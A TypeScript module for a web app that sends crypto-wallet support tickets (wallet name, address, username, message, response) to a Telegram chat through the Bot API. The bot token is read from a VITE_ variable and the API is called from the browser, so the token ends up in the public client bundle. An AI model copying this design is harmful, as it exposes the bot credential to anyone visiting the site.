/**
 * Telegram Bot API integration for immediate support notifications.
 * Mirrors the EmailJS pattern: reads config from VITE_* env vars,
 * sends a formatted HTML message to a configured chat.
 */

export interface TelegramTicket {
  network: string;
  issueCategory: string;
  message?: string;
  response?: string;
  username?: string;
  walletName?: string;
  publicAddress?: string;
  timestamp?: string;
}

export async function sendTelegramNotification(
  ticket: TelegramTicket
): Promise<{ success: boolean; message: string }> {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId   = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  // --- Debug (dev only) ---
  if (import.meta.env.DEV) {
    console.log('[Telegram] Token present:', !!botToken, '| Chat ID:', chatId);
  }

  if (!botToken || !chatId) {
    return {
      success: false,
      message:
        'Missing Telegram config. Set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in .env.local (and Cloudflare env vars).',
    };
  }

  // Escape HTML special chars for parse_mode: 'HTML'
  const esc = (s?: string) =>
    (s || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');

  const lines = [
    '🚨 <b>New Support Ticket</b>',
    '',
    `<b>Type:</b> ${esc(ticket.issueCategory) || '—'}`,
    `<b>Network:</b> ${esc(ticket.network) || '—'}`,
    `<b>Wallet:</b> ${esc(ticket.walletName) || '—'}`,
    `<b>Address:</b> <code>${esc(ticket.publicAddress) || '—'}</code>`,
    '',
    `<b>Username:</b> ${esc(ticket.username) || '—'}`,
    '',
    `<b>Message:</b>\n${esc(ticket.message) || '—'}`,
    ticket.response ? `\n<b>Response:</b>\n${esc(ticket.response)}` : '',
    '',
    '',
    `<i>${esc(ticket.timestamp || new Date().toISOString())}</i>`,
  ].filter(Boolean);

  const text = lines.join('\n');

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      }
    );

    const data = await res.json().catch(() => ({} as any));

    if (import.meta.env.DEV) {
      console.log('[Telegram] Response:', res.status, data);
    }

    if (res.ok && data.ok) {
      return { success: true, message: 'Telegram notification sent.' };
    }

    return {
      success: false,
      message: `Telegram error (${res.status}): ${data.description || 'Unknown error'}`,
    };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error('[Telegram] Exception:', msg);
    return { success: false, message: `Network error: ${msg}` };
  }
}